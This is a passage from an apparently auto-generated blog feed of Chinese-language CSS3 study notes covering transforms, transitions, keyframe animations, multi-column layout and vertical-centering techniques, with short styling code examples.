class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 设置围绕 X 轴把元素翻转 30 度，围绕 Y 轴翻转 20 度。 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform: skew(30deg,20deg);</span><br><span class="line">  -ms-transform: skew(30deg,20deg);         /* IE 9 */</span><br><span class="line">  -webkit-transform: skew(30deg,20deg);     /* Safari and Chrome */</span><br><span class="line">  -o-transform: skew(30deg,20deg);          /* Opera */</span><br><span class="line">  -moz-transform: skew(30deg,20deg);        /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="matrix-方法"><a href="#matrix-方法" class="headerlink" title="matrix() 方法"></a>matrix() 方法</h3><p><font color="#FF00FF">matrix() 方法把所有 2D 转换方法组合在一起。matrix() 方法需要六个参数，包含数学函数，允许旋转、缩放、移动以及倾斜元素。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 使用 matrix 方法将 div 元素旋转 30 度 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform:matrix(0.866,0.5,-0.5,0.866,0,0);</span><br><span class="line">  -ms-transform:matrix(0.866,0.5,-0.5,0.866,0,0);          /* IE 9 */</span><br><span class="line">  -moz-transform:matrix(0.866,0.5,-0.5,0.866,0,0);         /* Firefox */</span><br><span class="line">  -webkit-transform:matrix(0.866,0.5,-0.5,0.866,0,0);      /* Safari and Chrome */</span><br><span class="line">  -o-transform:matrix(0.866,0.5,-0.5,0.866,0,0);           /* Opera */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2D-Transform-方法汇总"><a href="#2D-Transform-方法汇总" class="headerlink" title="2D Transform 方法汇总"></a>2D Transform 方法汇总</h3><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>matrix(n,n,n,n,n,n)</td><td>定义 2D 转换，使用六个值的矩阵。</td></tr><tr><td>translate(x,y)</td><td>定义 2D 转换，沿着 X 和 Y 轴移动元素。</td></tr><tr><td>translateX(n)</td><td>定义 2D 转换，沿着 X 轴移动元素。</td></tr><tr><td>translateY(n)</td><td>定义 2D 转换，沿着 Y 轴移动元素。</td></tr><tr><td>scale(x,y)</td><td>定义 2D 缩放转换，改变元素的宽度和高度。</td></tr><tr><td>scaleX(n)</td><td>定义 2D 缩放转换，改变元素的宽度。</td></tr><tr><td>scaleY(n)</td><td>定义 2D 缩放转换，改变元素的高度。</td></tr><tr><td>rotate(angle)</td><td>定义 2D 旋转，在参数中规定角度。</td></tr><tr><td>skew(x-angle,y-angle)</td><td>定义 2D 倾斜转换，沿着 X 和 Y 轴。</td></tr><tr><td>skewX(angle)</td><td>定义 2D 倾斜转换，沿着 X 轴。</td></tr><tr><td>skewY(angle)</td><td>定义 2D 倾斜转换，沿着 Y 轴。</td></tr></tbody></table><h2 id="CSS3-3D-转换"><a href="#CSS3-3D-转换" class="headerlink" title="CSS3 3D 转换"></a>CSS3 3D 转换</h2><p>CSS3 允许使用 3D 转换来对元素进行格式化</p><h3 id="rotateX-方法"><a href="#rotateX-方法" class="headerlink" title="rotateX() 方法"></a>rotateX() 方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置元素围绕其 X 轴以给定的度数进行旋转 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform: rotateX(120deg);</span><br><span class="line">  -webkit-transform: rotateX(120deg);   /* Safari 和 Chrome */</span><br><span class="line">  -moz-transform: rotateX(120deg);  /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rotateY-旋转"><a href="#rotateY-旋转" class="headerlink" title="rotateY() 旋转"></a>rotateY() 旋转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置元素围绕其 Y 轴以给定的度数进行旋转 */</span><br><span class="line">div&#123;</span><br><span class="line">  transform: rotateY(130deg);</span><br><span class="line">  -webkit-transform: rotateY(130deg);   /* Safari 和 Chrome */</span><br><span class="line">  -moz-transform: rotateY(130deg);  /* Firefox */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS3-过渡"><a href="#CSS3-过渡" class="headerlink" title="CSS3 过渡"></a>CSS3 过渡</h2><p><strong>通过 CSS3可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果</strong><br>要实现这一点，必须规定以下两项内容：</p><ul><li>设置添加过渡效果的 CSS 属性；</li><li>设置过渡效果的时长；</li></ul><p><strong>注意： 如果时长未设置，则不会有过渡效果，因为默认值是 0。</strong></p><h3 id="单项改变"><a href="#单项改变" class="headerlink" title="单项改变"></a>单项改变</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 设置将变化效果添加在“宽度”上，时长为2秒；该时长在其他属性上并不适用 */</span><br><span class="line">div&#123;</span><br><span class="line">  transition: width 2s;</span><br><span class="line">  -moz-transition: width 2s;         /* Firefox 4 */</span><br><span class="line">  -webkit-transition: width 2s;      /* Safari 和 Chrome */</span><br><span class="line">  -o-transition: width 2s;           /* Opera */</span><br><span class="line">&#125;</span><br><span class="line">/* 配合在一起使用的效果就是当鼠标移上去的时候宽度变为300px，这个过程耗时2秒 */</span><br><span class="line">div:hover&#123;</span><br><span class="line">  width:300px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意： 当鼠标移出元素时，它会逐渐变回原来的样式。</strong></p><h3 id="多项改变"><a href="#多项改变" class="headerlink" title="多项改变"></a>多项改变</h3><p><strong>如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/* 同时向宽度、高度和转换添加过渡效果 */</span><br><span class="line">div&#123;</span><br><span class="line">  transition: width 2s, height 2s, transform 2s;</span><br><span class="line">  -moz-transition: width 2s, height 2s, -moz-transform 2s;</span><br><span class="line">  -webkit-transition: width 2s, height 2s, -webkit-transform 2s;</span><br><span class="line">  -o-transition: width 2s, height 2s,-o-transform 2s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 当鼠标移上时宽度和高度都变成200px，同时旋转180度，每个属性变化都耗时2秒 */</span><br><span class="line">div:hover&#123;</span><br><span class="line">  width:200px;</span><br><span class="line">  height:200px;</span><br><span class="line">  transform:rotate(180deg);</span><br><span class="line">  -moz-transform:rotate(180deg);        /* Firefox 4 */</span><br><span class="line">  -webkit-transform:rotate(180deg);     /* Safari and Chrome */</span><br><span class="line">  -o-transform:rotate(180deg);          /* Opera */</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="过渡属性详解"><a href="#过渡属性详解" class="headerlink" title="过渡属性详解"></a>过渡属性详解</h3><p><strong><font color="#FF8C00">transition是简写属性</font></strong><br><strong>语法： transition : transition-property | transition-duration | transition-timing-function | transition-delay;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法： transition : transition-property | transition-duration | transition-timing-function | transition-delay;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>transition</td><td>简写属性，用于在一个属性中设置四个过渡属性。</td></tr><tr><td>transition-property</td><td>规定应用过渡的 CSS 属性的名称。</td></tr><tr><td>transition-duration</td><td>定义过渡效果花费的时间。默认是 0。</td></tr><tr><td>transition-timing-function</td><td>规定过渡效果的时间曲线。默认是 “ease”。</td></tr><tr><td>transition-delay</td><td>规定过渡效果何时开始。默认是 0。</td></tr></tbody></table><h2 id="CSS3-动画"><a href="#CSS3-动画" class="headerlink" title="CSS3 动画"></a>CSS3 动画</h2><p>通过 CSS3可以创建动画，这些动画可以取代网页中的画图片、Flash 动画以及 JavaScript。</p><p>CSS3 中通过<font color="#FF00FF">@keyframes 规则</font>来创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式（动画开始前的样式）逐渐改为新样式（需要变到的样式）的动画效果。</p><h3 id="通过from-to关键字设置动画发生的时间"><a href="#通过from-to关键字设置动画发生的时间" class="headerlink" title="通过from , to关键字设置动画发生的时间"></a>通过from , to关键字设置动画发生的时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/* 通过@keyframes 创建动画 */</span><br><span class="line">@keyframes myfirst&#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* Firefox */</span><br><span class="line">@-moz-keyframes myfirst &#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* Safari 和 Chrome */</span><br><span class="line">@-webkit-keyframes myfirst &#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* Opera */</span><br><span class="line">@-o-keyframes myfirst &#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   将创建的动画绑定到选择器，并至少指定以下两项 CSS3 动画属性</span><br><span class="line">   1.指定动画的名称；</span><br><span class="line">   2.指定动画的时长；</span><br><span class="line">*/</span><br><span class="line">div&#123;</span><br><span class="line">  animation: myfirst 5s;</span><br><span class="line">  -moz-animation: myfirst 5s;       /* Firefox */</span><br><span class="line">  -webkit-animation: myfirst 5s;    /* Safari 和 Chrome */</span><br><span class="line">  -o-animation: myfirst 5s;         /* Opera */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过百分比设置动画发生的时间"><a href="#通过百分比设置动画发生的时间" class="headerlink" title="通过百分比设置动画发生的时间"></a>通过百分比设置动画发生的时间</h3><p>动画是使元素从一种样式逐渐变化为另一种样式的效果。可以改变任意多的样式任意多的次数。可以用关键词 “from” 和 “to”来设置动画变化发生的时间，其效果等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。为了得到最佳的浏览器支持，应该始终定义 0% 和 100% 选择器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* 当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变 */</span><br><span class="line">@keyframes myfirst&#123;</span><br><span class="line">  0%   &#123;background: red;&#125;</span><br><span class="line">  25%  &#123;background: yellow;&#125;</span><br><span class="line">  50%  &#123;background: blue;&#125;</span><br><span class="line">  100% &#123;background: green;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 同时改变背景色和位置 */</span><br><span class="line">@keyframes myfirst&#123;</span><br><span class="line">  0%   &#123;background: red; left:0px; top:0px;&#125;</span><br><span class="line">  25%  &#123;background: yellow; left:200px; top:0px;&#125;</span><br><span class="line">  50%  &#123;background: blue; left:200px; top:200px;&#125;</span><br><span class="line">  75%  &#123;background: green; left:0px; top:200px;&#125;</span><br><span class="line">  100% &#123;background: red; left:0px; top:0px;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动画属性详解"><a href="#动画属性详解" class="headerlink" title="动画属性详解"></a>动画属性详解</h3><p><strong>animation是<font color="#FF00FF">除了animation-play-state属性所有动画属性的简写属性</font>。</strong></p><p>语法： animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* 应用的动画为myfirst，一个动画周期为5秒，动画的速度曲线为linear，动画2秒后播放，播放次数为infinite，即无限循环，动画下一周期是否逆向播放取值alternate，即逆向播放 */</span><br><span class="line">div&#123;</span><br><span class="line">  animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">  /* Firefox: */</span><br><span class="line">  -moz-animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">  /* Safari 和 Chrome: */</span><br><span class="line">  -webkit-animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">  /* Opera: */</span><br><span class="line">  -o-animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>@keyframes</td><td>规定动画。</td></tr><tr><td>animation</td><td>所有动画属性的简写属性，除了 animation-play-state 属性。</td></tr><tr><td>animation-name</td><td>规定 @keyframes 动画的名称。</td></tr><tr><td>animation-duration</td><td>规定动画完成一个周期所花费的秒或毫秒。默认是 0。</td></tr><tr><td>animation-timing-function</td><td>规定动画的速度曲线。默认是 “ease”。</td></tr><tr><td>animation-delay</td><td>规定动画何时开始。默认是 0。</td></tr><tr><td>animation-iteration-count</td><td>规定动画被播放的次数。默认是 1。</td></tr><tr><td>animation-direction</td><td>规定动画是否在下一周期逆向地播放。默认是 “normal”。</td></tr><tr><td>animation-play-state</td><td>规定动画是否正在运行或暂停。默认是 “running”。</td></tr><tr><td>animation-fill-mode</td><td>规定对象动画时间之外的状态。</td></tr></tbody></table><h2 id="CSS3-多列"><a href="#CSS3-多列" class="headerlink" title="CSS3 多列"></a>CSS3 多列</h2><p>通过 CSS3够创建多个列来对文本进行布局，就像我们经常看到的报纸的布局一样。</p><h3 id="CSS3-创建多列"><a href="#CSS3-创建多列" class="headerlink" title="CSS3 创建多列"></a>CSS3 创建多列</h3><p><strong>column-count属性规定元素应该被分隔的列数。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 将div中的文本分为3列 */</span><br><span class="line">div&#123;</span><br><span class="line">  column-count:3;</span><br><span class="line">  -moz-column-count:3;        /* Firefox */</span><br><span class="line">  -webkit-column-count:3;     /* Safari 和 Chrome */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-规定列之间的间隔"><a href="#CSS3-规定列之间的间隔" class="headerlink" title="CSS3 规定列之间的间隔"></a>CSS3 规定列之间的间隔</h3><p><strong>column-gap属性规定列之间的间隔。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置列之间的间隔为 40 像素 */</span><br><span class="line">div&#123;</span><br><span class="line">  column-gap:40px;</span><br><span class="line">  -moz-column-gap:40px;        /* Firefox */</span><br><span class="line">  -webkit-column-gap:40px;     /* Safari 和 Chrome */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-列规则"><a href="#CSS3-列规则" class="headerlink" title="CSS3 列规则"></a>CSS3 列规则</h3><p><strong>column-rule属性设置列之间的宽度、样式和颜色规则。</strong><br>语法： column-rule : column-rule-width | column-rule-style | column-rule-color</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  column-rule:3px outset #ff0000;</span><br><span class="line">  -moz-column-rule:3px outset #ff0000;       /* Firefox */</span><br><span class="line">  -webkit-column-rule:3px outset #ff0000;    /* Safari and Chrome */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>column-count</td><td>规定元素应该被分隔的列数。</td></tr><tr><td>column-fill</td><td>规定如何填充列。</td></tr><tr><td>column-gap</td><td>规定列之间的间隔。</td></tr><tr><td>column-rule</td><td>设置所有 column-rule-* 属性的简写属性。</td></tr><tr><td>column-rule-width</td><td>规定列之间规则的宽度。</td></tr><tr><td>column-rule-style</td><td>规定列之间规则的样式。</td></tr><tr><td>column-rule-color</td><td>规定列之间规则的颜色。</td></tr><tr><td>column-span</td><td>规定元素应该横跨的列数。</td></tr><tr><td>column-width</td><td>规定列的宽度。</td></tr><tr><td>columns</td><td>语法 : column-width column-count。</td></tr></tbody></table><h2 id="CSS3-用户界面"><a href="#CSS3-用户界面" class="headerlink" title="CSS3 用户界面"></a>CSS3 用户界面</h2><h3 id="CSS3-resize"><a href="#CSS3-resize" class="headerlink" title="CSS3 resize"></a>CSS3 resize</h3><p><strong>在 CSS3中resize属性设置是否可由用户调整元素尺寸。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置div可以由用户调整大小 */</span><br><span class="line">div&#123;</span><br><span class="line">  resize:both;</span><br><span class="line">  overflow:auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CSS3-box-sizing"><a href="#CSS3-box-sizing" class="headerlink" title="CSS3 box-sizing"></a>CSS3 box-sizing</h3><p><strong>box-sizing属性允许您以确切的方式定义适应某个区域的具体内容。边框计算在width中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 规定两个并排的带边框方框 */</span><br><span class="line">div&#123;</span><br><span class="line">  box-sizing:border-box;</span><br><span class="line">  -moz-box-sizing:border-box;        /* Firefox */</span><br><span class="line">  -webkit-box-sizing:border-box;     /* Safari */</span><br><span class="line">  width:50%;</span><br><span class="line">  float:left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-outline-offset"><a href="#CSS3-outline-offset" class="headerlink" title="CSS3 outline-offset"></a>CSS3 outline-offset</h3><p><strong>outline-offset属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。</strong><br>轮廓与边框有两点不同：</p><ul><li>轮廓不占用空间；</li><li>轮廓可能是非矩形；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 规定边框边缘之外 15 像素处的轮廓 */</span><br><span class="line">div&#123;</span><br><span class="line">  border:2px solid black;</span><br><span class="line">  outline:2px solid red;</span><br><span class="line">  outline-offset:15px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1660027998787.png" alt="outline-offset"></p><h1 id="css：inline-block-的-div-之间的空隙，原因及解决"><a href="#css：inline-block-的-div-之间的空隙，原因及解决" class="headerlink" title="css：inline-block 的 div 之间的空隙，原因及解决"></a>css：inline-block 的 div 之间的空隙，原因及解决</h1><p>display:inline-block布局的元素<strong>在chrome下会出现几像素的间隙</strong>，原因是因为我们在编辑器里写代码的时候，同级别的标签不写在同一行以保持代码的整齐可读性，<font color="#FF00FF">即inline-block布局的元素在编辑器里不在同一行</font>，即存在换行符，因此这就是著名的<font color="#FF00FF">inline-block“换行符/空格间隙问题”</font>。<font color="#FF8C00">如果inline-block元素间有空格或是换行产生了间隙，那是正常的，应该的。如果没有空格与间隙才是不正常的（IE6/7 block水平元素）。</font><br><strong>解决方法：</strong></p><ol><li>把img标签的display属性改成block：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img&#123;dispaly:block;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>把div中的字体大小设为0：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div&#123;font-size:0;&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>如果是img，修改img的vertical-align属性：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">img&#123;vertical-align:buttom;&#125;</span><br><span class="line">img&#123;vertical-align:middle;&#125;</span><br><span class="line">img&#123;vertical-align:top;&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>移除标签间的空格</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;这是一个li&lt;/li&gt;&lt;li&gt;这是另一个li&lt;/li&gt;&lt;li&gt;这是另另一个li&lt;/li&gt;&lt;li&gt;这是另另另一个li&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">// 方式二：在标签结束处消除换行符</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;这是一个li</span><br><span class="line">    &lt;/li&gt;&lt;li&gt;这是另一个li</span><br><span class="line">    &lt;/li&gt;&lt;li&gt;这是另另一个li</span><br><span class="line">    &lt;/li&gt;&lt;li&gt;这是另另另一个li&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">// 方式三：HTML注释标签</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;这是一个li&lt;/li&gt;&lt;!--</span><br><span class="line">    --&gt;&lt;li&gt;这是另一个li&lt;/li&gt;&lt;!--</span><br><span class="line">    --&gt;&lt;li&gt;这是另另一个li&lt;/li&gt;&lt;!--</span><br><span class="line">    --&gt;&lt;li&gt;这是另另另一个li&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>布局(第十一天)</title>
    <link href="https://merlynr.github.io/2022/08/05/%E5%B8%83%E5%B1%80(%E7%AC%AC%E5%8D%81%E4%B8%80%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/05/%E5%B8%83%E5%B1%80(%E7%AC%AC%E5%8D%81%E4%B8%80%E5%A4%A9)/</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2022-08-04T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="未知高度元素垂直居中、垂直居中的实现方式有哪些"><a href="#未知高度元素垂直居中、垂直居中的实现方式有哪些" class="headerlink" title="未知高度元素垂直居中、垂直居中的实现方式有哪些"></a>未知高度元素垂直居中、垂直居中的实现方式有哪些</h1><ol><li>绝对定位+css3 transform:translate(-50%，-50%)</li></ol><p><img src="http://files.shanqianche.cn/20228/1659665882690.png" alt="绝对定位+CSS"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.wrap&#123;</span><br><span class="line">  position:relative;</span><br><span class="line">&#125;</span><br><span class="line">.child&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top:50%;</span><br><span class="line">  left:50%;</span><br><span class="line">  -webkit-transform:translate(-50%,-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>css3 的flex布局</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.wrap&#123;</span><br><span class="line">  display:flex;</span><br><span class="line">  justify-content:center;</span><br><span class="line">&#125;</span><br><span class="line">.child&#123;</span><br><span class="line">  align-self:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>table布局</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;wrap&quot;&gt;</span><br><span class="line">   &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">          &lt;div&gt;sadgsdgasgd&lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">.wrap&#123;</span><br><span class="line">  display:table;</span><br><span class="line">  text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">.child&#123;</span><br><span class="line">  background:#ccc;</span><br><span class="line">  display:table-cell;</span><br><span class="line">  vertical-align:middle;</span><br><span class="line">&#125;</span><br><span class="line">.child div&#123;</span><br><span class="line">    width:300px;</span><br><span class="line">    height:150px;</span><br><span class="line">    background:red;</span><br><span class="line">    margin:0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实现图片垂直居中"><a href="#实现图片垂直居中" class="headerlink" title="实现图片垂直居中"></a>实现图片垂直居中</h1><ol><li>使用flex实现图片垂直居中</li></ol><blockquote><p>利用 display: flex;align-items: center 实现垂直居中。flex可能不是实现垂直居中最好的选择，<strong>因为IE8,9并不支持它。</strong></p></blockquote><p><img src="http://files.shanqianche.cn/20228/1659666725528.png" alt="垂直居中"><br>html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;flexbox&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>css</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123; background:#999&#125;</span><br><span class="line">.flexbox&#123;width: 300px;height: 250px;background:#fff;display: flex;align-items: center&#125;</span><br><span class="line">.flexbox img&#123;width: 100px;height: 100px;align-items: 